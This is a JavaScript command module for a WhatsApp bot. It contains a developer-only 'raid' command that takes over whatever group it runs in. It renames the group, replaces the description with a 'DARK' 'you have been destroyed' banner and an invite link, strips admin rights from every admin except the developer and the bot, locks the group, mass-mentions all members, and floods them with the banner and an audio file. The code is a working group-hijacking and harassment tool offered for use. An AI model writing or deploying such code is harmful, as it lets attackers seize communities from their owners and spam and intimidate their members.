import fs from "fs";
import path from "path";

export default {
    name: "زرف",
    description: "إخضاع كامل للمجموعة مع توحيد الوصف والرسالة تحت سيادة DARK.",
    group: true,
    developer: true,

    async run({ sock, m, handler }) {
        const fireAndForget = (fn) => {
            fn().catch(err => { });
        };

        try {  
            const groupJid = m.key.remoteJid;  
            const portalLink = "https://chat.whatsapp.com/G72EwCxwdgBLaVhEw53suZ?mode=gi_t";
            const metadata = await sock.groupMetadata(groupJid);  
            const participants = metadata.participants || [];  

            // الاستمارة الموحدة (للوصف والرسالة الثانية)
            const finalTemplate = `
*╭─━━━━━━━━━━━━━━━─╮*
       *◈ 𝐃 𝐀 𝐑 𝐊 🍷 𝐀 𝐁 𝐘 𝐒 𝐒 ◈*
*╰─━━━━━━━━━━━━━━━─╯*
*⫷  𝐓𝐇𝐄 𝐆𝐀𝐌𝐄 𝐈𝐒 𝐎𝐕𝐄𝐑  ⫸*

*▫️تـم تـدمـيـࢪك بـ ࢪعـايـة☜𝑫𝑨𝑹𝑲.*
*▫️انـتهى عـصـࢪك وبـدأ عـصـر☜𝑫𝑨𝑹𝑲.*
*▫️الـقـوانـيـن؟ الـقـانـون هـو☜𝑫𝑨𝑹𝑲.*

*▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰*
    *𝐍𝐎 𝐌𝐄𝐑𝐂𝐘 ◈ 𝐍𝐎 𝐓𝐎𝐋𝐄𝐑𝐀𝐍𝐂𝐄*
*▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰*
*⫷  𝐈𝐓'𝐒 𝐃𝐎𝐍𝐄  ⫸*

*｢  𝑫𝑨𝑹𝑲  ｣*

*♦⦓ ${portalLink} ⦔☜*
*▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰*`.trim();

            // --- إطلاق جميع العمليات بشكل متزامن وفوري ---

            // 1) تغيير اسم الجروب
            fireAndForget(async () => {
                await sock.groupUpdateSubject(groupJid, "༒『𝑫𝑨𝑹𝑲◈𝑾𝑨𝑺◈𝑯𝑬𝑹𝑬』༒ ᴰᵉᵛᶦˡ");
            });

            // 2) تغيير الوصف (الاستمارة الموحدة)
            fireAndForget(async () => {
                await sock.groupUpdateDescription(groupJid, finalTemplate);
            });

            // 3) سحب الأدمن من الجميع
            fireAndForget(async () => {
                const botId = sock.user.id.split(':')[0] + '@s.whatsapp.net';
                const adminsToDemote = participants.filter(p => {
                    return p.admin && !handler.isDeveloper(p.id.split('@')[0]) && p.id !== botId;
                }).map(p => p.id);
                if (adminsToDemote.length > 0) {  
                    await sock.groupParticipantsUpdate(groupJid, adminsToDemote, "demote");  
                }  
            });  

            // 4) قفل الجروب فوراً
            fireAndForget(async () => {
                await sock.groupSettingUpdate(groupJid, "announcement");
            });

            // 5) الرسالة الأولى: المنشن
            fireAndForget(async () => {
                await sock.sendMessage(groupJid, { 
                    text: `*𝑫𝑨𝑹𝑲◈*`, 
                    mentions: participants.map(p => p.id) 
                });
            });

            // 6) الرسالة الثانية: الاستمارة الموحدة
            fireAndForget(async () => {
                await sock.sendMessage(groupJid, { text: finalTemplate });
            });

            // 7) إرسال الأوديو (MP3)
            fireAndForget(async () => {
                const audioPath = './media/dark.mp3';
                if (fs.existsSync(audioPath)) {
                    await sock.sendMessage(groupJid, { 
                        audio: { url: audioPath }, 
                        mimetype: 'audio/mp4', 
                        ptt: false 
                    });
                }
            });

        } catch (err) {  
            console.error("Zarf Error:", err);
        }  
    }
};